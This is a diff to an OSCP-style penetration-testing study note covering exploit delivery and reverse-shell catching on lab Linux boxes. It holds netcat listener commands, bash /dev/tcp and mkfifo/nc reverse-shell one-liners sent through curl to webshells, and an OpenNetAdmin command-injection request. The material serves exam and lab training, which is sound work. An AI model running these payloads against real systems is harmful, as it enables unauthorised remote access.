@@ -4,22 +4,33 @@
 
 *Run a confirmed remote exploit and catch the resulting shell.*
 
+> [!tip] 💡 Follow-along mode
+> You are here only after the service and exploit checks match. Open [[Exploit Editing and Resource Guide]] if the PoC needs changes. Prove `id` first, use two terminals for listener and delivery, then stabilise the shell before local enumeration.
+
 ## Run this
 
-> **Why:** This version or banner check identifies the exact product release before a matching public exploit is considered.
+> **Why:** A listener blocks while it waits for a connection, so the callback listener and exploit delivery must run in separate terminals. The first delivery should request harmless identity output whenever the PoC supports a command argument.
+
+Terminal 1, on Kali:
 ```bash
-nc -lnvp $Lport
-perl $ExploitFile $BoxIP
-python3 $ExploitFile $BoxIP
+nc -lvnp "$Lport"
 ```
+
+Terminal 2, on Kali, after adapting the reviewed exploit:
+
+```bash
+python3 "$BoxDir/exploits/$ExploitName" "$BoxIP" "id"
+```
+
+If the PoC uses a different interpreter or argument order, use the exact invocation shown in its source and record the change. Do not run both interpreter examples blindly.
 
 ## Example output
 
- > *Example shape only: the exact exploit invocation is not yet verified against a real box.*
+ > *Example shape only: replace the generic values with the exact invocation from the reviewed exploit.*
 ```
 [+] Exploit sent
 listening on 0.0.0.0 $Lport ...
-connect to 10.10.10.1 from 10.10.10.2
+connect from $BoxIP
 $ whoami
 username
 ```
@@ -30,7 +41,7 @@ username
 - [ ] The shell comes back as root → **Run `id` and `whoami` to confirm UID 0, record the proof path privately, and go to Step 21 · [[Linux - Clean Down]]**
 - [ ] The exploit returns an error → **Copy the complete error into `$BoxDir/loot/exploit-error.txt`, then go to Step 10 · [[Linux - Exploit Search]]**
 - [ ] A shell connects but has no job control → **Go to Step 12 · [[Linux - Shell Stabilise]]**
-- [ ] No callback after multiple attempts → **Run `sudo tcpdump -ni tun0 'host $BoxIP and tcp'`, try the documented bind-shell command, then retry the reverse shell on `$ListenPort` only once**
+- [ ] No callback after multiple attempts → **Run `sudo tcpdump -ni tun0 "host $BoxIP and tcp"`, check the listener, interpreter, and egress port, then retry the reverse shell on `$Lport` only once**
 
 ## OpenNetAdmin 18.1.1 command injection
 
@@ -50,9 +61,17 @@ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&
 After a phpbash-style endpoint returns command output, send the callback through the same POST parameter. Start the listener first, use URL encoding for the complete command, and discard the HTTP response because the shell is the useful result.
 
 > **Why:** The listener is ready before the web request launches Bash, preventing a fast callback from being missed.
+
+Terminal 1, on Kali:
 ```bash
-nc -lvnp $Port
-curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" "http://$BoxIP/$Path" >/dev/null
+nc -lvnp "$Lport"
+```
+
+Terminal 2, on Kali:
+
+```bash
+Command="bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
+curl -sS -X POST --data-urlencode "cmd=$Command" "http://$BoxIP:$WebPort/$Path" >/dev/null
 ```
 
 > [!warning] 💡
@@ -63,9 +82,17 @@ curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Po
 Some uploaded shells read `cmd` from `$_GET` instead of POST data. Use `-G` with `--data-urlencode` so shell metacharacters remain a single query parameter.
 
 > **Why:** This request matches a GET-based webshell and safely proves the callback command is delivered as one parameter.
+
+Terminal 1, on Kali:
 ```bash
-nc -lvnp $Port
-curl -sS -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" "http://$BoxIP/$Path" >/dev/null
+nc -lvnp "$Lport"
+```
+
+Terminal 2, on Kali:
+
+```bash
+Command="bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
+curl -sS -G --data-urlencode "cmd=$Command" "http://$BoxIP:$WebPort/$Path" >/dev/null
 ```
 
 ## Notes
@@ -75,13 +102,11 @@ Only run the interpreter command that matches the exploit file. For reverse shel
 ## Gotcha
 
 > [!warning] 💡
-> The exact exploit invocation depends on the discovered service. If it was not tested in the write-ups, confirm it before relying on it.
+> The exact exploit invocation depends on the discovered service. If the exploit is not represented by a completed write-up, follow [[Exploit Editing and Resource Guide]] and prove `id` before requesting a callback.
 
 > [!warning] 💡
 > If the payload uses `/dev/tcp` syntax, it requires bash. Shells that run via `/bin/sh` (e.g. from PostgreSQL `COPY TO PROGRAM`, some CGI handlers) will silently fail on bash-only payloads. Use a mkfifo or nc-based payload instead: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LocalIP $Lport > /tmp/f`
 
-> [!warning]
-> Command not yet verified against a real box. Confirm the exact exploit interpreter, arguments, and listener port before relying on this page in an exam.
 ## Fragile custom-server callback
 
 Custom servers may accept one connection, require a null terminator, and crash after a malformed request. Prepare the listener first, send the reviewed payload once, and keep the triggering socket open briefly if the shellcode starts through that connection.
@@ -112,6 +137,8 @@ python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
 - [[OSCP/BOXES/WRITE UPS/Linux/SwagShop|SwagShop]] -- authenticated Magento RCE produced a FIFO/Netcat `www-data` shell
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- cron filename injection produced a `guly` reverse shell
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- WordPress plugin RFI was verified with `id`, then converted to a base64-wrapped reverse shell
+- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- SmEvK Console command execution was URL-encoded and converted into a Bash reverse shell
+- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- Nostromo command execution was verified with `id` before catching a `www-data` callback
 
 ## Related stages
 
